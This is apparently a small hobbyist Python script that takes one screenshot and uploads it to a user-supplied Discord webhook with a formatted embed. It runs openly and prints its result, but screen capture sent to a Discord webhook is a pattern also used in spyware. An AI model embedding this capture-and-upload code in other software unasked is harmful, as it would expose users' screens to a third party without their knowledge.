"""
THIS WAS CODED BY CRYSTALPT. PLEASE DO NOT STEAL WITHOUT CREDITS.
MAIN GITHUB LINK: https://github.com/CrystalPT
"""

import pyautogui
import requests
import io
import json
from datetime import datetime

# IMPORTANT!: AT LINE 68 INPUT YOUR WEBHOOK URL

def take_screenshot():
    """Take a screenshot and return it as a bytes object."""
    # Take screenshot
    screenshot = pyautogui.screenshot()
    
    # Convert to bytes
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    return img_byte_arr

def send_to_discord(webhook_url, image_bytes, message="Screenshot"):
    """Send the screenshot to Discord via webhook with nice formatting."""
    # Current time for filename and display
    timestamp = datetime.now()
    timestamp_str = timestamp.strftime("%Y-%m-%d %H:%M:%S")
    filename = f"screenshot_{timestamp.strftime('%Y%m%d_%H%M%S')}.png"
    
    # First, upload the image to Discord
    files = {
        'file': (filename, image_bytes.getvalue(), 'image/png')
    }
    
    # Create a nice embed with the image
    embed = {
        "title": "**📸 Screenshot Captured**",
        "description": f"**{message}**\n\nTaken at: **{timestamp_str}**",
        "color": 3447003,  # A nice blue color
        "footer": {
            "text": "Automated Screenshot Service"
        },
        "timestamp": timestamp.isoformat(),
        "image": {
            "url": "attachment://" + filename
        }
    }
    payload = {
        "embeds": [embed]
    }
    response = requests.post(
        webhook_url, 
        files=files,
        data={"payload_json": json.dumps(payload)}
    )
    # Check if successful
    if response.status_code == 204 or response.status_code == 200:
        print(f"Screenshot sent successfully to Discord! ({timestamp_str})")
        return True
    else:
        print(f"Failed to send screenshot: {response.status_code}, {response.text}")
        return False
def main():
    # Replace this with your actual Discord webhook URL
    webhook_url = "YOUR_WEBHOOK_WEBHOOK_URL"
    # Optional message to send with the screenshot
    message = "Screen capture from your computer"
    # Take screenshot
    screenshot_bytes = take_screenshot()
    # Send to Discord
    send_to_discord(webhook_url, screenshot_bytes, message)

if __name__ == "__main__":
    main()
